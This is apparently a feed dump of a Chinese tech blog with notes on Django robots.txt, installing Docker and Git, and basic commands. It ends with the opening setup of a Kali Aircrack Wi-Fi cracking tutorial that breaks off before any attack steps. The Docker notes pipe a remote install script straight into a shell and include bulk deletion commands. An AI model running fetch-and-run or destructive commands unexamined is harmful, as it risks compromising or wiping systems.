        <content type="html"><![CDATA[<h3 id="方法1：将robots-txt放到templates目录，修改urls-py"><a href="#方法1：将robots-txt放到templates目录，修改urls-py" class="headerlink" title="方法1：将robots.txt放到templates目录，修改urls.py"></a>方法1：将robots.txt放到templates目录，修改urls.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.views.generic <span class="keyword">import</span> TemplateView</span><br><span class="line"></span><br><span class="line">url(</span><br><span class="line">        <span class="string">r&quot;^robots\.txt$&quot;</span>,</span><br><span class="line">        TemplateView.as_view(template_name=<span class="string">&quot;robots.txt&quot;</span>, content_type=<span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法2：不需添加robots-txt文件，修改urls-py"><a href="#方法2：不需添加robots-txt文件，修改urls-py" class="headerlink" title="方法2：不需添加robots.txt文件，修改urls.py"></a>方法2：不需添加robots.txt文件，修改urls.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line">url(</span><br><span class="line">        <span class="string">r&quot;^robots\.txt$&quot;</span>,</span><br><span class="line">        <span class="keyword">lambda</span> r: HttpResponse(</span><br><span class="line">                <span class="string">&quot;User-agent: *\nDisallow: /admin&quot;</span>, content_type=<span class="string">&quot;text/plain&quot;</span></span><br><span class="line">        ),</span><br><span class="line">),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法3：将robots-txt放到根目录，修改nginx配置"><a href="#方法3：将robots-txt放到根目录，修改nginx配置" class="headerlink" title="方法3：将robots.txt放到根目录，修改nginx配置"></a>方法3：将robots.txt放到根目录，修改nginx配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location  /robots.txt &#123;</span><br><span class="line">    alias  /根目录/robots.txt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No57：Docker安装方法</title>
      <link href="/posts/3720223a.html"/>
      <url>/posts/3720223a.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>安装前准备工作</li></ul><p>卸载清理原有docker程序，如果之前没安装过docker可以不用执行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-selinux docker-engine-selinux docker-engine</span><br></pre></td></tr></table></figure><ul><li>安装依赖软件，添加docker-ce安装源</li></ul><p>yum-utils提供yum-config-manager包，用来管理yum配置文件。</p><p>lvm2和device-mapper-persistent-data为dockerdevicemapper存储设备的必须依赖。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure><ul><li>添加docker-ce安装源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>默认开启的是stable稳定版仓库，如果想要安装test测试版或者是边缘版本可使用如下命令开启相关模式，关闭的话只需要将–enable参数换成–disable。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum-config-manager --enable docker-ce-edge</span><br><span class="line">yum-config-manager --enable docker-ce-test</span><br></pre></td></tr></table></figure><ul><li>安装docker-CE</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认安装的是最新版本的稳定版</span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果要安装特定版本的docker-CE请使用如下命令格式</span></span><br><span class="line">yum install -y docker-ce-&lt;VERSION STRING&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本列表请使用如下命令</span></span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><ul><li>常用命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动docker服务</span></span><br><span class="line">systemctl start docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker服务</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看docker状态</span></span><br><span class="line">systemctl status docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动docker服务</span></span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><ul><li>配置镜像加速器</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件，没有请新建</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加以下内容：</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://bwzbq3db.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载配置</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><ul><li>问题整理，报错“WARNING: IPv4 forwarding is disabled. Networking will not work”</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原因：未开启ipv4转发，解决办法如下</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑文件</span></span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置转发</span></span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否成功,如果返回为“net.ipv4.ip_forward=1”则表示成功</span></span><br><span class="line">sysctl net.ipv4.ip_forward</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>获取最新版本的Docker安装包，并且安装Docker及依赖包。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>安装完成后有个提示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">If you would like to use Docker as a non-root user, you should now consider</span><br><span class="line">adding your user to the &quot;docker&quot; group with something like:</span><br><span class="line">sudo usermod -aG docker runoob</span><br><span class="line">Remember that you will have to log out and back in for this to take effect!</span><br></pre></td></tr></table></figure><p>意思是，当要以非root用户可以直接运行docker时，需要执行以下命令，然后重新登陆，否则会报错。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker runoob</span><br></pre></td></tr></table></figure><ul><li>常用命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动docker服务</span></span><br><span class="line">sudo service docker start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker服务</span></span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><ul><li>配置镜像加速器</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件，没有请新建</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加以下内容：</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://bwzbq3db.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No56：Docker基础操作</title>
      <link href="/posts/c1d6c914.html"/>
      <url>/posts/c1d6c914.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、运行容器"><a href="#1、运行容器" class="headerlink" title="1、运行容器"></a>1、运行容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -t scrapyd:latest .</span><br><span class="line">docker run -d -p 6800:6800 scrapyd</span><br><span class="line">docker run -i -t python:3.6 /bin/bash</span><br><span class="line">docker run -d -p 4444:4444 selenium/standalone-chrome</span><br><span class="line">docker run -d -p 4444:4444 --shm-size=2g selenium/standalone-chrome</span><br></pre></td></tr></table></figure><h3 id="2、操作容器"><a href="#2、操作容器" class="headerlink" title="2、操作容器"></a>2、操作容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看容器运行日志</span></span><br><span class="line">docker logs -f 容器ID</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器</span></span><br><span class="line">docker exec -it 容器ID /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件包列表</span></span><br><span class="line">apt update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装vim</span></span><br><span class="line">apt install -y vim</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出容器</span></span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3 id="3、保存镜像到本地，镜像导入服务器并修改标签"><a href="#3、保存镜像到本地，镜像导入服务器并修改标签" class="headerlink" title="3、保存镜像到本地，镜像导入服务器并修改标签"></a>3、保存镜像到本地，镜像导入服务器并修改标签</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull xxx/xxx:latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存镜像到本地</span></span><br><span class="line">docker save 容器ID -o &gt; ~/xxx.tar</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">镜像导入服务器</span></span><br><span class="line">docker load &lt; xxx.tar</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改镜像标签</span></span><br><span class="line">docker tag 容器ID xxx/xxx:latest</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、容器、镜像删除"><a href="#4、容器、镜像删除" class="headerlink" title="4、容器、镜像删除"></a>4、容器、镜像删除</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有容器（container）：</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止所有容器（container），这样才能够删除其中的镜像（images）：</span></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除容器（container），通过容器（container）的<span class="built_in">id</span>来指定删除：</span></span><br><span class="line">docker rm &lt;容器 id&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除所有容器（container）：</span></span><br><span class="line">docker rm $(docker ps -a -q)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有镜像（images）：</span></span><br><span class="line">docker images -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除镜像（images），通过镜像（images）的<span class="built_in">id</span>来指定删除：</span></span><br><span class="line">docker rmi &lt;镜像 id&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除untagged images，也就是那些<span class="built_in">id</span>为&lt;None&gt;的image：</span></span><br><span class="line">docker rmi $(docker images | grep &quot;^&lt;none&gt;&quot; | awk &quot;&#123;print $3&#125;&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除全部镜像（images）的话</span></span><br><span class="line">docker rmi $(docker images -a)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No55：Flask常见问题汇总</title>
      <link href="/posts/84945945.html"/>
      <url>/posts/84945945.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、连接Mysql时出现Warning-1366"><a href="#1、连接Mysql时出现Warning-1366" class="headerlink" title="1、连接Mysql时出现Warning 1366"></a>1、连接Mysql时出现Warning 1366</h3><ul><li>解决方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>] = <span class="string">&quot;mysql+mysqlconnector://账号:密码@localhost/appname&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、ModuleNotFoundError-No-module-named-‘flask-compat’"><a href="#2、ModuleNotFoundError-No-module-named-‘flask-compat’" class="headerlink" title="2、ModuleNotFoundError: No module named ‘flask._compat’"></a>2、ModuleNotFoundError: No module named ‘flask._compat’</h3><ul><li>解决方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改flask_script/__init__.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from ._compat import text_type</span></span><br><span class="line"><span class="comment"># 改为下面导入路径</span></span><br><span class="line"><span class="keyword">from</span> flask_script._compat <span class="keyword">import</span> text_type</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No54：Git安装方法</title>
      <link href="/posts/d403cdd2.html"/>
      <url>/posts/d403cdd2.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure><ul><li>配置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;guoxianru&quot;</span><br><span class="line">git config --global user.email &quot;admin@addcoder.com&quot;</span><br></pre></td></tr></table></figure><ul><li>创建公钥</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -C &#x27;admin@addcoder.com&#x27; -t rsa</span><br><span class="line">cd ~/.ssh</span><br><span class="line">vim id_rsa.pub</span><br></pre></td></tr></table></figure><ul><li>安装新版本(root)</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建新yum存储库配置文件</span></span><br><span class="line">vim /etc/yum.repos.d/wandisco-git.repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">插入以下内容并保存退出</span></span><br><span class="line">[wandisco-git]</span><br><span class="line">name=Wandisco GIT Repository</span><br><span class="line">baseurl=http://opensource.wandisco.com/centos/7/git/$basearch/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://opensource.wandisco.com/RPM-GPG-KEY-WANdisco</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入存储库GPG密钥</span></span><br><span class="line">rpm --import http://opensource.wandisco.com/RPM-GPG-KEY-WANdisco</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">yum install git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证</span></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>安装git</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No53：Git基础操作</title>
      <link href="/posts/22f526fc.html"/>
      <url>/posts/22f526fc.html</url>
      
        <content type="html"><![CDATA[<ul><li>git常用命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化本地git环境</span></span><br><span class="line">git init</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">克隆一份代码到本地仓库</span></span><br><span class="line">git clone XXX</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把远程库的代码更新到工作台</span></span><br><span class="line">git pull</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">强制把远程库的代码跟新到当前分支上面</span></span><br><span class="line">git pull --rebase origin master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把远程库的代码更新到本地库</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把本地的修改加到stage中</span></span><br><span class="line">git add .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把stage中的修改提交到本地库</span></span><br><span class="line">git commit -m &#x27;comments here&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把本地库的修改提交到远程库中</span></span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看远程分支/全部分支</span></span><br><span class="line">git branch -r/-a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到某个分支</span></span><br><span class="line">git checkout master/branch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建<span class="built_in">test</span>分支</span></span><br><span class="line">git checkout -b test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除<span class="built_in">test</span>分支</span></span><br><span class="line">git checkout -d test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">假设当前在<span class="built_in">test</span>分支上面，把master分支上的修改同步到<span class="built_in">test</span>分支上</span></span><br><span class="line">git merge master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调用merge工具</span></span><br><span class="line">git merge tool</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把未完成的修改缓存到栈容器中</span></span><br><span class="line">git stash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有的缓存</span></span><br><span class="line">git stash list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复本地分支到缓存状态</span></span><br><span class="line">git stash pop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某个文件的每一行的修改记录（）谁在什么时候修改的）</span></span><br><span class="line">git blame someFile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前分支有哪些修改</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前分支上面的日志信息</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前没有add的内容</span></span><br><span class="line">git diff</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看已经add但是没有commit的内容</span></span><br><span class="line">git diff --cache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上面两个内容的合并</span></span><br><span class="line">git diff HEAD</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">撤销本地修改</span></span><br><span class="line">git reset --hard HEAD</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看git config的HOME路径</span></span><br><span class="line">echo $HOME</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置git config的HOME路径</span></span><br><span class="line">export $HOME=/c/gitconfig</span><br></pre></td></tr></table></figure><ul><li>团队协作git操作流程</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">克隆代码库</span></span><br><span class="line">git clone XXX</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建分支</span></span><br><span class="line">git checkout -b test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完成修改</span></span><br><span class="line">modify some files</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把修改加入stage中</span></span><br><span class="line">git add .</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到master分支</span></span><br><span class="line">git commit -m &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">review代码</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到master分支</span></span><br><span class="line">git checkout master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新代码</span></span><br><span class="line">git pull</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到<span class="built_in">test</span>分支</span></span><br><span class="line">git checkout test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把master分支的代码merge到<span class="built_in">test</span>分支</span></span><br><span class="line">git meger master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把<span class="built_in">test</span>分支的代码push到远程库</span></span><br><span class="line">git push origin 分支名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No52：Git如何回退代码到历史指定版本</title>
      <link href="/posts/f23e2fa4.html"/>
      <url>/posts/f23e2fa4.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、查询历史对应不同版本的ID，用于回退使用"><a href="#1、查询历史对应不同版本的ID，用于回退使用" class="headerlink" title="1、查询历史对应不同版本的ID，用于回退使用"></a>1、查询历史对应不同版本的ID，用于回退使用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log --pretty=oneline</span><br></pre></td></tr></table></figure><h3 id="2、使用git-log命令查看所有的历史版本"><a href="#2、使用git-log命令查看所有的历史版本" class="headerlink" title="2、使用git log命令查看所有的历史版本"></a>2、使用git log命令查看所有的历史版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取你git的某个历史版本的<span class="built_in">id</span>，假设查到历史版本的<span class="built_in">id</span>：</span></span><br><span class="line"></span><br><span class="line">fae6966548e3ae76cfa7f38a461c438cf75ba965</span><br></pre></td></tr></table></figure><h3 id="3、恢复到历史版本"><a href="#3、恢复到历史版本" class="headerlink" title="3、恢复到历史版本"></a>3、恢复到历史版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard fae6966548e3ae76cfa7f38a461c438cf75ba965</span><br></pre></td></tr></table></figure><h3 id="4、把修改推到远程服务器"><a href="#4、把修改推到远程服务器" class="headerlink" title="4、把修改推到远程服务器"></a>4、把修改推到远程服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -f -u origin master  </span><br></pre></td></tr></table></figure><h3 id="5、重新更新就可以了"><a href="#5、重新更新就可以了" class="headerlink" title="5、重新更新就可以了"></a>5、重新更新就可以了</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No51：Kali的Aircrack破解无线网络</title>
      <link href="/posts/44b83179.html"/>
      <url>/posts/44b83179.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><h4 id="1-检查网络"><a href="#1-检查网络" class="headerlink" title="1.检查网络"></a>1.检查网络</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用网卡</span></span><br><span class="line">ifconfig eth0 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看IP</span></span><br><span class="line">ifconfig -a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分配IP</span></span><br><span class="line">dhclient eth0</span><br></pre></td></tr></table></figure><h4 id="2-更换镜像源"><a href="#2-更换镜像源" class="headerlink" title="2.更换镜像源"></a>2.更换镜像源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用文本编辑器打开sources.list,手动添加更新源</span></span><br><span class="line">leafpad /etc/apt/sources.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">官方源</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">阿里云</span></span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h4 id="3-升级系统及软件"><a href="#3-升级系统及软件" class="headerlink" title="3.升级系统及软件"></a>3.升级系统及软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除缓存索引</span></span><br><span class="line">apt-get clean</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">刷新源，获得最近的软件包的列表</span></span><br><span class="line">apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新现有的软件包</span></span><br><span class="line">apt-get upgrade</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据依赖关系更新</span></span><br><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h4 id="4-修改系统默认语言"><a href="#4-修改系统默认语言" class="headerlink" title="4.修改系统默认语言"></a>4.修改系统默认语言</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span 